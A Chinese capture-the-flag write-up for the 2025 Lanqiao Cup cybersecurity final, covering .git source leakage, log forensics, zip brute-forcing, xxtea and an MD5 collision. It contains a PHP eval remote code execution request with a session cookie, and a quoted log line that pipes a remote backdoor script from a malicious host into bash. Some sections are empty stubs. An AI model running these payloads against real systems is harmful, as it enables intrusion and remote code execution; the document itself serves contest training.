---
title: 2025 蓝桥杯网络安全赛道全国总决赛 WriteUp（GitHack 源码泄露 + xxtea + fastcoll MD5 碰撞）
contest: 2025 蓝桥杯网络安全赛道
year: 2025
difficulty: easy
vuln_type: [web_unknown, crypto_unknown, auth_bypass, sqli]
tags: [蓝桥杯 2025 网络安全 国赛, 被遗忘的 GitHack 源码泄露, loginpass cookie 828193099115dcaa67805a0776785b3a, action=eval&phpcode=system, server_logs dnsmasq.log 攻击者 IP 192.168.42.77, ssh Accepted password attacker, hidden_backdoor 服务名, flowzip2 正则 d{3} 爆破三位数字密码, xxtea 反向解密, fastcoll MD5 碰撞 gamelab_1.txt]
attack_chain:
  - 被遗忘的: GitHack 工具下载源码 → 代码审计 xx.php → action=eval&phpcode=system("cat /flag")
  - loginpass=828193099115dcaa67805a0776785b3a cookie 模拟登录
  - server_logs: dnsmasq.log 第 602 行可疑域名 → IP 192.168.42.77 → ssh 成功日志 attacker
  - hidden_backdoor 后门服务 → flag{attacker_192.168.42.77_hidden_backdoor_data.leak.ev}
  - flowzip2: 流量包导出 zip → 注释正则 d{3} 三位数字 → 批量爆破
  - xxtea: 反向解密 4eb88a16-be48-4de2-ab2a-ed09a09ed386
  - fastcoll: MD5 碰撞生成两个不同文件同 MD5
key_payload: "GitHack 工具下载源码 + action=eval&phpcode=system"
one_liner: 2025 蓝桥杯网络安全国赛：GitHack 源码泄露 + ssh attacker IP 溯源 + xxtea 解密 + fastcoll MD5 碰撞。
lesson: 蓝桥杯网络安全赛道是国内官方赛事，难度中等；GitHack / GitTools 是 .git 源码泄露首选工具；fastcoll 工具是 MD5 碰撞最简方案；ssh 日志找 attacker IP 是经典溯源题。
quality: medium
---

# 2025 蓝桥杯网络安全赛道全国总决赛 WriteUp

## 一、情报收集

### 1. 被遗忘的（Git 源码泄露）

题目提示：IDE 注释 `// Fix: Remember to …` + `tools` 路径提示。

```bash
# GitHack 工具下载源码
python GitHack.py http://target/.git/
# 代码审计 xx.php
```

```http
POST /xx.php HTTP/1.1
Host: xxxxx.cloudeci1.ichunqiu.com
Cookie: loginpass=828193099115dcaa67805a0776785b3a
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

action=eval&phpcode=system("cat /flag")
```
**action=eval 后门**直接传 `phpcode=system("cat /flag")` 拿 flag。

## 二、数据分析

### 1. server_logs（攻击者 IP 溯源）

`/var/log/dnsmasq.log` 第 602 行可疑域名 → 攻击者 IP = **192.168.42.77**

ssh 日志：
```
Jun 15 02:30:15 server sshd[5678]: Accepted password for attacker from 192.168.42.77 port 1337
Jun 15 02:30:30 server sudo: attacker : TTY=pts/0 ; COMMAND=curl -s http://malicious.site/backdoor.sh | bash
```

后门脚本名：**hidden_backdoor**

**flag{attacker_192.168.42.77_hidden_backdoor_data.leak.ev}**

### 2. flowzip2（zip 密码爆破）

流量包导出 zip → zip 注释正则 `d{3}`（三位数字）→ 批量爆破。

**flag{5f5491b6-fddf-4be8-ab44-5a18831cc45b}**

## 三、密码破解

### 1. xxtea（反向解密）

```python
# 根据题目给的步骤反过来解密
```
**flag{4eb88a16-be48-4de2-ab2a-ed09a09ed386}**

### 2. fastcoll（MD5 碰撞）

```bash
fastcoll_v1.0.0.5.exe -p gamelab_1.txt -o gamelab_2.txt gamelab_3.txt
```
MD5 碰撞生成两个不同文件但 MD5 相同。

### 3. qppq
（其他题目）
